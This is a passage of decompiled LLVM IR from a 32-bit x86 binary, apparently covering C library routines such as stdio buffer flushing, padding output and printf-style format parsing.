  store i32 %v0_8050647, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8050650 = call i32 @function_8050568(i32 %v0_8050647)
  store i32 %v1_8050650, i32* @edi, align 4
  %v0_805065a = load i32, i32* @global_var_805d680.302, align 128
  store i32 %v0_805065a, i32* @esi, align 4
  %v1_8050660 = inttoptr i32 %v1_8050650 to i32*
  %v2_8050660 = load i32, i32* %v1_8050660, align 4
  store i32 %v2_8050660, i32* %ebp.global-to-local, align 4
  %v1_8050664 = call i32 @function_8051730(i32 0)
  %v0_8050669 = load i32, i32* @ebx, align 4
  %v2_805066b = sub i32 %v0_8050669, %v1_8050664
  %v2_8050676 = mul i32 %v2_805066b, 256
  %v0_8050679 = load i32, i32* @esi, align 4
  %v2_8050679 = xor i32 %v0_8050679, %v2_8050676
  %v1_805067b = trunc i32 %v2_8050679 to i16
  store i16 %v1_805067b, i16* bitcast (i32* @global_var_805d680.302 to i16*), align 128
  %v0_8050682 = load i32, i32* @global_var_805d6d0.303, align 16
  store i32 %v0_8050682, i32* @esi, align 4
  %v1_8050688 = call i32 @function_8051730(i32 1)
  %v0_805068d = load i32, i32* @ebx, align 4
  %v2_805068d = sub i32 %v0_805068d, %v1_8050688
  %v2_805068f = mul i32 %v2_805068d, 256
  %v0_8050692 = load i32, i32* @esi, align 4
  %v2_8050692 = xor i32 %v2_805068f, %v0_8050692
  %v1_8050694 = trunc i32 %v2_8050692 to i16
  store i16 %v1_8050694, i16* bitcast (i32* @global_var_805d6d0.303 to i16*), align 16
  %v0_805069b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805069b = load i32, i32* @edi, align 4
  %v2_805069b = inttoptr i32 %v1_805069b to i32*
  store i32 %v0_805069b, i32* %v2_805069b, align 4
  %v2_80506a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80506a0, i32* @ebx, align 4
  store i32 %v0_8050646, i32* @esi, align 4
  store i32 %v0_8050645, i32* @edi, align 4
  ret i32 %v1_8050688

; uselistorder directives
  uselistorder i32 %v1_8050650, { 1, 0 }
}

define i32 @function_80506a5(i32 %arg1) local_unnamed_addr {
dec_label_pc_80506a5:
  %v3_80506b3 = inttoptr i32 %arg1 to i16*
  %v4_80506b3 = call i32 @function_8051414(i16* %v3_80506b3, i32 ptrtoint (i32* @global_var_805b5c0.306 to i32), i32 24)
  ret i32 %v4_80506b3
}

define i32 @function_80506bc() local_unnamed_addr {
dec_label_pc_80506bc:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80506bc = load i32, i32* @esi, align 4
  %v0_80506bd = load i32, i32* @ebx, align 4
  store i32 %v0_80506bd, i32* %stack_var_-8, align 4
  %v1_80506c6 = call i32 @function_80506a5(i32 ptrtoint (i32* @global_var_805d640.307 to i32))
  store i32 %v1_80506c6, i32* %eax.global-to-local, align 4
  %v1_80506d2 = call i32 @function_80506a5(i32 ptrtoint (i32* @global_var_805d658.308 to i32))
  store i32 %v1_80506d2, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_805071c22 = icmp eq i32 %storemerge21, 0
  %v1_805071e23 = icmp eq i1 %v1_805071c22, false
  br i1 %v1_805071e23, label %dec_label_pc_80506df.lr.ph, label %dec_label_pc_805073c.preheader

dec_label_pc_80506df.lr.ph:                       ; preds = %dec_label_pc_80506bc
  br label %dec_label_pc_80506df

dec_label_pc_80506df:                             ; preds = %dec_label_pc_80506df.lr.ph, %dec_label_pc_8050706
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_80506df.lr.ph ], [ %storemerge, %dec_label_pc_8050706 ]
  %v1_80506e2 = add i32 %storemerge24, 56
  store i32 %v1_80506e2, i32* @esi, align 4
  %v1_80506e6 = call i32 @function_80535cf(i32 %v1_80506e2)
  store i32 %v1_80506e6, i32* %eax.global-to-local, align 4
  %v1_80506ee = icmp eq i32 %v1_80506e6, 0
  br i1 %v1_80506ee, label %dec_label_pc_8050706, label %dec_label_pc_80506f2

dec_label_pc_80506f2:                             ; preds = %dec_label_pc_80506df
  %v0_80506f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80506f2 = add i32 %v0_80506f2, 8
  %v2_80506f2 = inttoptr i32 %v1_80506f2 to i32*
  %v3_80506f2 = load i32, i32* %v2_80506f2, align 4
  store i32 %v3_80506f2, i32* %eax.global-to-local, align 4
  %v1_80506f5 = inttoptr i32 %v0_80506f2 to i16*
  store i16 48, i16* %v1_80506f5, align 2
  %v0_80506fa = load i32, i32* %eax.global-to-local, align 4
  %v1_80506fa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506fa = add i32 %v1_80506fa, 24
  %v3_80506fa = inttoptr i32 %v2_80506fa to i32*
  store i32 %v0_80506fa, i32* %v3_80506fa, align 4
  %v0_80506fd = load i32, i32* %eax.global-to-local, align 4
  %v1_80506fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506fd = add i32 %v1_80506fd, 28
  %v3_80506fd = inttoptr i32 %v2_80506fd to i32*
  store i32 %v0_80506fd, i32* %v3_80506fd, align 4
  %v0_8050700 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050700 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050700 = add i32 %v1_8050700, 16
  %v3_8050700 = inttoptr i32 %v2_8050700 to i32*
  store i32 %v0_8050700, i32* %v3_8050700, align 4
  %v0_8050703 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050703 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050703 = add i32 %v1_8050703, 20
  %v3_8050703 = inttoptr i32 %v2_8050703 to i32*
  store i32 %v0_8050703, i32* %v3_8050703, align 4
  br label %dec_label_pc_8050706

dec_label_pc_8050706:                             ; preds = %dec_label_pc_80506df, %dec_label_pc_80506f2
  %v0_8050709 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050709 = add i32 %v0_8050709, 52
  %v2_8050709 = inttoptr i32 %v1_8050709 to i32*
  store i32 1, i32* %v2_8050709, align 4
  %v0_8050710 = load i32, i32* @esi, align 4
  %v1_8050711 = call i32 @function_80506a5(i32 %v0_8050710)
  store i32 %v1_8050711, i32* %eax.global-to-local, align 4
  %v0_8050716 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050716 = add i32 %v0_8050716, 32
  %v2_8050716 = inttoptr i32 %v1_8050716 to i32*
  %storemerge = load i32, i32* %v2_8050716, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_805071c = icmp eq i32 %storemerge, 0
  %v1_805071e = icmp eq i1 %v1_805071c, false
  br i1 %v1_805071e, label %dec_label_pc_80506df, label %dec_label_pc_8050719.dec_label_pc_805073c.preheader_crit_edge

dec_label_pc_8050719.dec_label_pc_805073c.preheader_crit_edge: ; preds = %dec_label_pc_8050706
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  br label %dec_label_pc_805073c.preheader

dec_label_pc_805073c.preheader:                   ; preds = %dec_label_pc_8050719.dec_label_pc_805073c.preheader_crit_edge, %dec_label_pc_80506bc
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8050719.dec_label_pc_805073c.preheader_crit_edge ], [ %storemerge21, %dec_label_pc_80506bc ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_805073c3 = icmp eq i32 %storemerge12, 0
  %v1_805073e10 = icmp eq i1 %v1_805073c3, false
  br i1 %v1_805073e10, label %dec_label_pc_8050728.preheader, label %dec_label_pc_8050740

dec_label_pc_8050728.preheader:                   ; preds = %dec_label_pc_805073c.preheader
  br label %dec_label_pc_8050728

dec_label_pc_8050728:                             ; preds = %dec_label_pc_8050728.preheader, %dec_label_pc_8050739
  %v0_8050730 = phi i32 [ %storemerge1, %dec_label_pc_8050739 ], [ %storemerge12, %dec_label_pc_8050728.preheader ]
  %v1_8050728 = inttoptr i32 %v0_8050730 to i8*
  %v2_8050728 = load i8, i8* %v1_8050728, align 1
  %v3_8050728 = and i8 %v2_8050728, 64
  %v4_8050728 = icmp eq i8 %v3_8050728, 0
  br i1 %v4_8050728, label %dec_label_pc_8050739, label %dec_label_pc_805072d

dec_label_pc_805072d:                             ; preds = %dec_label_pc_8050728
  %v1_8050731 = call i32 @function_8050744(i32 %v0_8050730)
  store i32 %v1_8050731, i32* %eax.global-to-local, align 4
  %v0_8050739.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050739

dec_label_pc_8050739:                             ; preds = %dec_label_pc_8050728, %dec_label_pc_805072d
  %v0_8050739 = phi i32 [ %v0_8050730, %dec_label_pc_8050728 ], [ %v0_8050739.pre, %dec_label_pc_805072d ]
  %v1_8050739 = add i32 %v0_8050739, 32
  %v2_8050739 = inttoptr i32 %v1_8050739 to i32*
  %storemerge1 = load i32, i32* %v2_8050739, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_805073c = icmp eq i32 %storemerge1, 0
  %v1_805073e = icmp eq i1 %v1_805073c, false
  br i1 %v1_805073e, label %dec_label_pc_8050728, label %dec_label_pc_8050740

dec_label_pc_8050740:                             ; preds = %dec_label_pc_8050739, %dec_label_pc_805073c.preheader
  %v2_8050740 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050740, i32* %eax.global-to-local, align 4
  %v2_8050741 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050741, i32* %ebx.global-to-local, align 4
  store i32 %v0_80506bc, i32* @esi, align 4
  ret i32 %v2_8050740

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 9, 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_8050739, { 1, 0 }
  uselistorder label %dec_label_pc_8050728, { 1, 0 }
  uselistorder label %dec_label_pc_8050706, { 1, 0 }
  uselistorder label %dec_label_pc_80506df, { 1, 0 }
}

define i32 @function_8050744(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050744:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8050744 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805074c = add i32 %arg1, 8
  %v2_805074c = inttoptr i32 %v1_805074c to i32*
  %v3_805074c = load i32, i32* %v2_805074c, align 4
  store i32 %v3_805074c, i32* %edx.global-to-local, align 4
  %v1_805074f = add i32 %arg1, 16
  %v2_805074f = inttoptr i32 %v1_805074f to i32*
  %v3_805074f = load i32, i32* %v2_805074f, align 4
  %v2_8050752 = sub i32 %v3_805074f, %v3_805074c
  %v12_8050752 = icmp eq i32 %v2_8050752, 0
  store i32 %v2_8050752, i32* %eax.global-to-local, align 4
  br i1 %v12_8050752, label %dec_label_pc_8050765, label %dec_label_pc_8050756

dec_label_pc_8050756:                             ; preds = %dec_label_pc_8050744
  store i32 %v3_805074c, i32* %v2_805074f, align 4
  %v0_8050759 = load i32, i32* @ecx, align 4
  %v0_805075a = load i32, i32* %eax.global-to-local, align 4
  %v0_805075b = load i32, i32* %edx.global-to-local, align 4
  %v0_805075c = load i32, i32* @ebx, align 4
  %v4_805075d = inttoptr i32 %v0_805075c to i16*
  %v5_805075d = call i32 @function_8053c8c(i16* %v4_805075d, i32 %v0_805075b, i32 %v0_805075a, i32 %v0_8050759)
  store i32 %v5_805075d, i32* %eax.global-to-local, align 4
  %v0_8050765.pre = load i32, i32* @ebx, align 4
  %v2_805076b.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8050765

dec_label_pc_8050765:                             ; preds = %dec_label_pc_8050744, %dec_label_pc_8050756
  %v2_805076b = phi i32 [ %tmp11, %dec_label_pc_8050744 ], [ %v2_805076b.pre, %dec_label_pc_8050756 ]
  %v0_8050765 = phi i32 [ %arg1, %dec_label_pc_8050744 ], [ %v0_8050765.pre, %dec_label_pc_8050756 ]
  %v1_8050765 = add i32 %v0_8050765, 16
  %v2_8050765 = inttoptr i32 %v1_8050765 to i32*
  %v3_8050765 = load i32, i32* %v2_8050765, align 4
  store i32 %v3_8050765, i32* %eax.global-to-local, align 4
  %v2_8050768 = add i32 %v0_8050765, 8
  %v3_8050768 = inttoptr i32 %v2_8050768 to i32*
  %v4_8050768 = load i32, i32* %v3_8050768, align 4
  %v5_8050768 = sub i32 %v3_8050765, %v4_8050768
  store i32 %v5_8050768, i32* %eax.global-to-local, align 4
  store i32 %v2_805076b, i32* @edx, align 4
  store i32 %v0_8050744, i32* @ebx, align 4
  ret i32 %v5_8050768

; uselistorder directives
  uselistorder i32 %v0_8050765, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050765, { 1, 0 }
}

define i32 @function_8050770() local_unnamed_addr {
dec_label_pc_8050770:
  %stack_var_-13 = alloca i32, align 4
  %v0_8050770 = load i32, i32* @edi, align 4
  %v0_8050771 = load i32, i32* @esi, align 4
  %v0_8050772 = load i32, i32* @ebx, align 4
  %v0_8050773 = load i32, i32* @eax, align 4
  store i32 %v0_8050773, i32* @edi, align 4
  %v0_8050778 = load i32, i32* @ecx, align 4
  store i32 %v0_8050778, i32* @esi, align 4
  store i32 %v0_8050778, i32* @ebx, align 4
  %v0_805077c = load i32, i32* @edx, align 4
  store i32 %v0_805077c, i32* %stack_var_-13, align 4
  %v1_80507832 = icmp eq i32 %v0_8050778, 0
  br i1 %v1_80507832, label %dec_label_pc_805079b, label %dec_label_pc_8050787.lr.ph

dec_label_pc_8050787.lr.ph:                       ; preds = %dec_label_pc_8050770
  %v2_8050787 = ptrtoint i32* %stack_var_-13 to i32
  %v4_805079022 = call i32 @function_8053d0c(i32 %v2_8050787, i32 1, i32 %v0_8050773, i32 %v0_805077c)
  %v8_805079824 = icmp eq i32 %v4_805079022, 1
  %v0_805078225 = load i32, i32* @ebx, align 4
  br i1 %v8_805079824, label %dec_label_pc_8050782, label %dec_label_pc_805079b.loopexit

dec_label_pc_8050782:                             ; preds = %dec_label_pc_8050787.lr.ph, %dec_label_pc_8050782.dec_label_pc_8050787_crit_edge
  %v0_805078226 = phi i32 [ %v0_8050782, %dec_label_pc_8050782.dec_label_pc_8050787_crit_edge ], [ %v0_805078225, %dec_label_pc_8050787.lr.ph ]
  %v1_8050782 = add i32 %v0_805078226, -1
  %v8_8050782 = icmp eq i32 %v1_8050782, 0
  store i32 %v1_8050782, i32* @ebx, align 4
  br i1 %v8_8050782, label %dec_label_pc_805079b.loopexit, label %dec_label_pc_8050782.dec_label_pc_8050787_crit_edge

dec_label_pc_8050782.dec_label_pc_8050787_crit_edge: ; preds = %dec_label_pc_8050782
  %v0_805078b.pre = load i32, i32* @edx, align 4
  %v0_805078c.pre = load i32, i32* @edi, align 4
  %v4_8050790 = call i32 @function_8053d0c(i32 %v2_8050787, i32 1, i32 %v0_805078c.pre, i32 %v0_805078b.pre)
  %v8_8050798 = icmp eq i32 %v4_8050790, 1
  %v0_8050782 = load i32, i32* @ebx, align 4
  br i1 %v8_8050798, label %dec_label_pc_8050782, label %dec_label_pc_805079b.loopexit

dec_label_pc_805079b.loopexit:                    ; preds = %dec_label_pc_8050782.dec_label_pc_8050787_crit_edge, %dec_label_pc_8050782, %dec_label_pc_8050787.lr.ph
  %v1_805079b.ph = phi i32 [ %v0_805078225, %dec_label_pc_8050787.lr.ph ], [ 0, %dec_label_pc_8050782 ], [ %v0_8050782, %dec_label_pc_8050782.dec_label_pc_8050787_crit_edge ]
  %v0_805079b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805079b

dec_label_pc_805079b:                             ; preds = %dec_label_pc_805079b.loopexit, %dec_label_pc_8050770
  %v0_805079b = phi i32 [ 0, %dec_label_pc_8050770 ], [ %v0_805079b.pre, %dec_label_pc_805079b.loopexit ]
  %v1_805079b = phi i32 [ 0, %dec_label_pc_8050770 ], [ %v1_805079b.ph, %dec_label_pc_805079b.loopexit ]
  %v2_805079b = sub i32 %v0_805079b, %v1_805079b
  store i32 %v0_8050772, i32* @ebx, align 4
  store i32 %v0_8050771, i32* @esi, align 4
  store i32 %v0_8050770, i32* @edi, align 4
  ret i32 %v2_805079b

; uselistorder directives
  uselistorder i32 %v1_8050782, { 1, 0 }
  uselistorder i32 %v2_8050787, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8050782, { 1, 0 }
}

define i32 @function_80507a6(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80507a6:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_80507b9 = trunc i32 %arg2 to i8
  %v5_80507b9 = icmp slt i8 %v3_80507b9, 0
  %v1_80507bb = icmp eq i1 %v5_80507b9, false
  br i1 %v1_80507bb, label %dec_label_pc_80507ec, label %dec_label_pc_80507bd

dec_label_pc_80507bd:                             ; preds = %dec_label_pc_80507a6
  %v1_80507c4 = inttoptr i32 %arg4 to i8*
  %v2_80507c4 = call i32 @function_80514b0(i8* %v1_80507c4)
  %v0_80507cc = load i32, i32* @ebx, align 4
  %v2_80507cc = sub i32 %v0_80507cc, %v2_80507c4
  store i32 %v2_80507cc, i32* @ebx, align 4
  store i32 %v2_80507c4, i32* @esi, align 4
  %tmp18 = icmp slt i32 %v2_80507cc, 1
  br i1 %tmp18, label %dec_label_pc_80507ea, label %dec_label_pc_80507d4

dec_label_pc_80507d4:                             ; preds = %dec_label_pc_80507bd
  %v0_80507d4 = load i32, i32* @edi, align 4
  %v1_80507d4 = urem i32 %v0_80507d4, 128
  store i32 %v1_80507d4, i32* @edi, align 4
  store i32 %v2_80507cc, i32* @ecx, align 4
  store i32 %v1_80507d4, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_80507df = call i32 @function_8050770()
  store i32 %v0_80507df, i32* @ebp, align 4
  %v12_80507e6 = icmp eq i32 %v0_80507df, %v2_80507cc
  %v1_80507e8 = icmp eq i1 %v12_80507e6, false
  br i1 %v1_80507e8, label %dec_label_pc_8050806, label %dec_label_pc_80507d4.dec_label_pc_80507ea_crit_edge

dec_label_pc_80507d4.dec_label_pc_80507ea_crit_edge: ; preds = %dec_label_pc_80507d4
  %v0_80507ea.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80507ea

dec_label_pc_80507ea:                             ; preds = %dec_label_pc_80507d4.dec_label_pc_80507ea_crit_edge, %dec_label_pc_80507bd
  %v0_80507ea = phi i32 [ %v0_80507ea.pre, %dec_label_pc_80507d4.dec_label_pc_80507ea_crit_edge ], [ %v2_80507c4, %dec_label_pc_80507bd ]
  store i32 %v0_80507ea, i32* @ebx, align 4
  br label %dec_label_pc_80507ec

dec_label_pc_80507ec:                             ; preds = %dec_label_pc_80507a6, %dec_label_pc_80507ea
  %v0_80507f7 = phi i32 [ %arg3, %dec_label_pc_80507a6 ], [ %v0_80507ea, %dec_label_pc_80507ea ]
  %tmp19 = icmp slt i32 %v0_80507f7, 1
  br i1 %tmp19, label %dec_label_pc_8050804, label %dec_label_pc_80507f2

dec_label_pc_80507f2:                             ; preds = %dec_label_pc_80507ec
  %v0_80507f2 = load i32, i32* @ecx, align 4
  %v4_80507fc = call i32 @function_8053d0c(i32 %arg4, i32 %v0_80507f7, i32 %arg1, i32 %v0_80507f2)
  br label %dec_label_pc_8050804

dec_label_pc_8050804:                             ; preds = %dec_label_pc_80507ec, %dec_label_pc_80507f2
  %v1_8050804 = phi i32 [ 0, %dec_label_pc_80507ec ], [ %v4_80507fc, %dec_label_pc_80507f2 ]
  %v0_8050804 = load i32, i32* @ebp, align 4
  %v2_8050804 = add i32 %v0_8050804, %v1_8050804
  br label %dec_label_pc_8050806

dec_label_pc_8050806:                             ; preds = %dec_label_pc_80507d4, %dec_label_pc_8050804
  %v0_8050809 = phi i32 [ %v0_80507df, %dec_label_pc_80507d4 ], [ %v2_8050804, %dec_label_pc_8050804 ]
  ret i32 %v0_8050809

; uselistorder directives
  uselistorder i32 %v0_80507f7, { 1, 0 }
  uselistorder i32 %v0_80507df, { 1, 0, 2 }
  uselistorder i32 %v1_80507d4, { 1, 0 }
  uselistorder i32 %v2_80507cc, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050806, { 1, 0 }
  uselistorder label %dec_label_pc_8050804, { 1, 0 }
  uselistorder label %dec_label_pc_80507ec, { 1, 0 }
}

define i32 @function_8050810(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050810:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_805081a = ptrtoint i8* %arg2 to i32
  store i32 %v4_805081a, i32* @ebx, align 4
  %v2_8050822 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8050822, i32* @esi, align 4
  %v4_8050827 = call i32 @function_8050db8(i32* nonnull %stack_var_-348, i32 %v4_805081a)
  store i32 %v4_8050827, i32* %eax.global-to-local, align 4
  %v2_805082f = icmp slt i32 %v4_8050827, 0
  %v1_8050831 = icmp eq i1 %v2_805082f, false
  br i1 %v1_8050831, label %dec_label_pc_8050871, label %dec_label_pc_8050833

dec_label_pc_8050833:                             ; preds = %dec_label_pc_8050810
  %v3_8050833 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8050833, i32* @ebx, align 4
  %v1_805083b = inttoptr i32 %v3_8050833 to i8*
  %v2_805083b = call i32 @function_80514b0(i8* %v1_805083b)
  store i32 %v2_805083b, i32* %eax.global-to-local, align 4
  %v1_8050843 = icmp eq i32 %v2_805083b, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_8050843, label %dec_label_pc_8050daa, label %dec_label_pc_8050852

dec_label_pc_8050852:                             ; preds = %dec_label_pc_8050833
  %v0_8050852 = load i32, i32* @edx, align 4
  %v0_805085b = load i32, i32* @ebx, align 4
  %v5_805085c = call i32 @function_8053d0c(i32 %v0_805085b, i32 %v2_805083b, i32 %arg1, i32 %v0_8050852)
  store i32 %v5_805085c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_8050daa

dec_label_pc_8050871:                             ; preds = %dec_label_pc_8050810
  %v5_805087b = call i32 @function_8050e28(i32 %v2_8050822, i32 %arg3, i32 %v4_8050827, i32 %v4_8050827)
  store i32 %v5_805087b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8050888 = load i32, i32* @ebx, align 4
  store i32 %v0_8050888, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050890

dec_label_pc_805088f:                             ; preds = %dec_label_pc_8050896
  %v1_805088f = add i32 %v0_805089e, 1
  store i32 %v1_805088f, i32* @ebx, align 4
  br label %dec_label_pc_8050890.backedge

dec_label_pc_8050890.backedge:                    ; preds = %dec_label_pc_805088f, %dec_label_pc_8050d90, %dec_label_pc_8050d9b
  %v1_805089a18 = phi i32 [ %v1_80508a2, %dec_label_pc_805088f ], [ %v3_8050d90, %dec_label_pc_8050d90 ], [ %v1_80508ce, %dec_label_pc_8050d9b ]
  %v0_805089016 = phi i32 [ %v1_805088f, %dec_label_pc_805088f ], [ %v3_8050d90, %dec_label_pc_8050d90 ], [ %v1_8050d9b, %dec_label_pc_8050d9b ]
  %v4_8050890.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050890

dec_label_pc_8050890:                             ; preds = %dec_label_pc_8050890.backedge, %dec_label_pc_8050871
  %v1_80508a2 = phi i32 [ %v1_805089a18, %dec_label_pc_8050890.backedge ], [ %v0_8050888, %dec_label_pc_8050871 ]
  %v0_805089e = phi i32 [ %v0_805089016, %dec_label_pc_8050890.backedge ], [ %v0_8050888, %dec_label_pc_8050871 ]
  %v4_8050890 = phi i32 [ %v4_8050890.pre, %dec_label_pc_8050890.backedge ], [ %v5_805087b, %dec_label_pc_8050871 ]
  %v1_8050890 = inttoptr i32 %v0_805089e to i8*
  %v2_8050890 = load i8, i8* %v1_8050890, align 1
  %v3_8050890 = zext i8 %v2_8050890 to i32
  %v5_8050890 = and i32 %v4_8050890, -256
  %v6_8050890 = or i32 %v3_8050890, %v5_8050890
  store i32 %v6_8050890, i32* %eax.global-to-local, align 4
  %v4_8050892 = icmp eq i8 %v2_8050890, 0
  br i1 %v4_8050892, label %dec_label_pc_805089a, label %dec_label_pc_8050896

dec_label_pc_8050896:                             ; preds = %dec_label_pc_8050890
  %v10_8050896 = icmp eq i8 %v2_8050890, 37
  %v1_8050898 = icmp eq i1 %v10_8050896, false
  br i1 %v1_8050898, label %dec_label_pc_805088f, label %dec_label_pc_805089a

dec_label_pc_805089a:                             ; preds = %dec_label_pc_8050896, %dec_label_pc_8050890
  %v2_805089a = sub i32 %v0_805089e, %v1_80508a2
  %v12_805089a = icmp eq i32 %v2_805089a, 0
  br i1 %v12_805089a, label %dec_label_pc_80508c5, label %dec_label_pc_805089e

dec_label_pc_805089e:                             ; preds = %dec_label_pc_805089a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805089a, i32* @esi, align 4
  %tmp64 = icmp slt i32 %v2_805089a, 1
  br i1 %tmp64, label %dec_label_pc_80508ba, label %dec_label_pc_80508a8

dec_label_pc_80508a8:                             ; preds = %dec_label_pc_805089e
  %v0_80508a8 = load i32, i32* @ebp, align 4
  %v1_80508a8 = load i32, i32* @esp, align 4
  %v2_80508a8 = add i32 %v1_80508a8, -4
  %v3_80508a8 = inttoptr i32 %v2_80508a8 to i32*
  store i32 %v0_80508a8, i32* %v3_80508a8, align 4
  %v1_80508a9 = add i32 %v1_80508a8, 368
  %v2_80508a9 = inttoptr i32 %v1_80508a9 to i32*
  %v3_80508a9 = load i32, i32* %v2_80508a9, align 4
  %v5_80508a9 = add i32 %v1_80508a8, -8
  %v6_80508a9 = inttoptr i32 %v5_80508a9 to i32*
  store i32 %v3_80508a9, i32* %v6_80508a9, align 4
  %v0_80508b0 = load i32, i32* @esi, align 4
  %v2_80508b0 = add i32 %v1_80508a8, -12
  %v3_80508b0 = inttoptr i32 %v2_80508b0 to i32*
  store i32 %v0_80508b0, i32* %v3_80508b0, align 4
  %v0_80508b1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80508b1 = add i32 %v1_80508a8, -16
  %v3_80508b1 = inttoptr i32 %v2_80508b1 to i32*
  store i32 %v0_80508b1, i32* %v3_80508b1, align 4
  %v0_80508b2 = load i32, i32* %stack_var_-364, align 4
  %v4_80508b2 = call i32 @function_8053d0c(i32 %v0_80508b2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80508b2, i32* %eax.global-to-local, align 4
  %v1_80508ba.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80508ba

dec_label_pc_80508ba:                             ; preds = %dec_label_pc_805089e, %dec_label_pc_80508a8
  %v3_80508c2 = phi i32 [ %v2_805089a, %dec_label_pc_805089e ], [ %v1_80508ba.pre, %dec_label_pc_80508a8 ]
  %v0_80508ba = phi i32 [ 0, %dec_label_pc_805089e ], [ %v4_80508b2, %dec_label_pc_80508a8 ]
  %v12_80508ba = icmp eq i32 %v0_80508ba, %v3_80508c2
  %v1_80508bc = icmp eq i1 %v12_80508ba, false
  %v0_8050da3.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_80508bc, label %dec_label_pc_8050da3, label %dec_label_pc_80508c2

dec_label_pc_80508c2:                             ; preds = %dec_label_pc_80508ba
  %v1_80508c2 = inttoptr i32 %v0_8050da3.pre.pre to i32*
  %v2_80508c2 = load i32, i32* %v1_80508c2, align 4
  %v4_80508c2 = add i32 %v2_80508c2, %v3_80508c2
  store i32 %v4_80508c2, i32* %v1_80508c2, align 4
  %v0_80508c5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80508c5

dec_label_pc_80508c5:                             ; preds = %dec_label_pc_805089a, %dec_label_pc_80508c2
  %v0_8050d9b = phi i32 [ %v0_805089e, %dec_label_pc_805089a ], [ %v0_80508c5.pre, %dec_label_pc_80508c2 ]
  %v1_80508c5 = inttoptr i32 %v0_8050d9b to i8*
  %v2_80508c5 = load i8, i8* %v1_80508c5, align 1
  %v3_80508c5 = icmp eq i8 %v2_80508c5, 0
  br i1 %v3_80508c5, label %dec_label_pc_8050daa, label %dec_label_pc_80508ce

dec_label_pc_80508ce:                             ; preds = %dec_label_pc_80508c5
  %v1_80508ce = add i32 %v0_8050d9b, 1
  store i32 %v1_80508ce, i32* %edx.global-to-local, align 4
  %v2_80508d1 = inttoptr i32 %v1_80508ce to i8*
  %v3_80508d1 = load i8, i8* %v2_80508d1, align 1
  %v12_80508d1 = icmp eq i8 %v3_80508d1, 37
  br i1 %v12_80508d1, label %dec_label_pc_8050d9b, label %dec_label_pc_80508db

dec_label_pc_80508db:                             ; preds = %dec_label_pc_80508ce
  %v1_80508db = load i32, i32* @esp, align 4
